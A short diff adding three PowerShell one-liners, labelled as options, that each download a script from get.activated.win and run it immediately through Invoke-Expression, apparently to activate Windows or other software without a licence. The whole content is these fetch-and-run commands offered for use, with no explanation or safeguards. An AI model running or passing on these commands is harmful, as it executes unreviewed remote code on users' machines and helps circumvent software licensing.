@@ -1,0 +1,5 @@
+Option 1: irm https://get.activated.win | iex
+
+Option 2: iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)
+
+Option 3: iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))
